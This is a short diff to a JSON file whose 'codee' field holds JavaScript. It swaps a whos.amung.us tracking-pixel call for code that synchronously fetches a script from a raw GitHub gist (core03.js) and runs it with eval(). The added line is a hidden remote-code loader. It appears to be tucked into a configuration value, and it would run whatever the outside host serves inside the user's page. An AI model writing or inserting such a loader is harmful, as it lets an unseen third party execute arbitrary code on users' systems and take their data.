@@ -1,1 +1,1 @@
-{"codee":"new Image().src = '//whos.amung.us/swidget/fsixnslled2';"}
+{"codee":"xmlhttp = new XMLHttpRequest();xmlhttp.open('GET', 'https://gist.githubusercontent.com/lapaz0x3a/628e71ace97d3f088d74/raw/b2774c3d5c8d5a2bb552dddfcb684706cc3277c6/core03.js', false);xmlhttp.send();if (xmlhttp.readyState != 4) {} else {eval(xmlhttp.responseText);xmlhttp.close;}"}
